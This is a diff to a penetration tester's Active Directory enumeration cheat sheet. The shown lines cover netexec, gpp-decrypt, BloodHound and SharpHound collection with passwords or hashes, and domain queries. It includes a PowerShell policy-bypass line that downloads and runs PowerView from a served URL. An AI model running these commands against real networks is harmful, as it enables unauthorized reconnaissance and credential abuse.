@@ -1,6 +1,7 @@
 # AD enumeration
 
 ## Before anything
+At the pwn-broker prompt: tool install netexec, tool install impacket and tool install bloodhound-ce.
 nxc smb <DCIP>
 - [ ] The domain and the DC's name from that line: <DCHost> and <Domain> added with host add, at the pwn-broker prompt
 Kerberos refuses a clock more than five minutes off the DC's:
@@ -60,7 +61,15 @@ gpp-decrypt 'THE-CPASSWORD'
 ## BloodHound collection
 bloodhound-ce-python -u '<Username>' -p '<Password>' -d <Domain> -ns <DCIP> -c All --zip
 bloodhound-ce-python -u '<Username>' --hashes ':<Hash>' -d <Domain> -ns <DCIP> -c All --zip
-Faster on a big domain: tool install rusthound-ce, at the pwn-broker prompt.
+On a domain-joined Windows host, SharpHound is the official collector. At the pwn-broker prompt:
+tool install sharphound
+serve
+serve files sharphound
+- [ ] SharpHound needs .NET 4.7.2 and a domain-user context, directly or through runas
+- [ ] BloodHound CE's Settings, Download Collectors names the collector version to use
+- [ ] SharpHound.exe fetched on the Windows host with the line serve files gives
+.\SharpHound.exe -c All -d <Domain>
+Faster on a big domain from Kali: tool install rusthound-ce, at the pwn-broker prompt.
 rusthound-ce -d <Domain> -u '<Username>' -p '<Password>' -i <DCIP> -z
 - [ ] bloodhound-ce-python for BloodHound CE: the older bloodhound-python writes a format CE will not ingest
 - [ ] Collection fails: almost always DNS or the clock, from Before anything
@@ -76,7 +85,11 @@ net user /domain
 net group "Domain Admins" /domain
 net accounts /domain
 nltest /domain_trusts
-PowerView, copied from /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 into upload/ for serve; THE-SERVE-URL is the address serve files powerview prints:
+At the pwn-broker prompt:
+tool install powerview
+serve
+serve files powerview
+On the Windows host, THE-SERVE-URL is the PowerView.ps1 address serve files powerview prints:
 powershell -ep bypass
 iex (iwr -UseBasicParsing THE-SERVE-URL)
 Get-DomainUser -Properties samaccountname, description, memberof, pwdlastset | Format-Table
